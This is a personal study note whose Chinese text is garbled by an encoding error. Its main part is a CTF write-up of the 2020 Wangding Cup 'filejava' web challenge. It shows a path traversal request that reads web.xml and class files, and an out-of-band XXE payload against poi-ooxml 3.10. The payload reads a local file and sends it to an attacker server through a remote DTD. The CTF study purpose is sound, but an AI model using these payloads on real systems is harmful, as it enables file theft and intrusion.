## CTF
- [x] webæ–¹å‘é¢˜ç›®(java)
### [ç½‘é¼æ¯ 2020 é’é¾™ç»„]filejava
#java
è®¿é—®åå‘ç°æ˜¯ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„æ¥å£,ä¸Šä¼ åå‘ç°å¯ä»¥ä¸‹è½½æ–‡ä»¶,å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–,æ ¹æ®æŠ¥é”™å¯çŸ¥æ˜¯tomcatæœåŠ¡å™¨,å°è¯•ä¸‹è½½web.xml
`/DownloadServlet?filename=../../../web.xml`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    <servlet>
        <servlet-name>DownloadServlet</servlet-name>
        <servlet-class>cn.abc.servlet.DownloadServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>DownloadServlet</servlet-name>
        <url-pattern>/DownloadServlet</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>ListFileServlet</servlet-name>
        <servlet-class>cn.abc.servlet.ListFileServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name></servlet-name>
        <url-pattern>/ListFileServlet</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>UploadServlet</servlet-name>
        <servlet-class>cn.abc.servlet.UploadServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>UploadServlet</servlet-name>
        <url-pattern>/UploadServlet</url-pattern>
    </servlet-mapping>
</web-app>
```
æˆ‘ä»¬å¯ä»¥å°†è¿™å‡ ä¸ªç±»éƒ½dumpä¸‹æ¥
`/DownloadServlet?filename=../../../WEB-INF/classes/cn/abc/servlet/DownloadServlet.class`

`UploadServlet`å­˜åœ¨XXEæ¼æ´
>ä¾èµ– poi-ooxmlçš„ç‰ˆæœ¬ä¿¡æ¯3.10 CVE-2014-3529

ä¸Šä¼ çš„`excel-1.xlsx` è§£å‹åä¿®æ”¹ .xmlæ–‡ä»¶ä¸º
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % remote SYSTEM "http://æœåŠ¡å™¨ip/1.dtd">
%remote;
%all;
]>
<root>&send;</root>
```

æœåŠ¡å™¨
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://ip:4444/%file;'>">
```
ç›‘å¬ç«¯å£4444

---
ä¸ºä»€ä¹ˆä¸ç›´æ¥åœ¨ä¸Šä¼ çš„æ–‡ä»¶é‡Œå°±æ‰§è¡Œsend æ“ä½œå‘¢ğŸ˜¶

## web3
- [ ] åŒºå—é“¾æ–‡ç« é˜…è¯»åŠåˆ†æ



## SRC
- [ ] SRCæ–‡ç« é˜…è¯»åŠåˆ†æ

## Misc
[[Tricks#Web Cache Deception]]

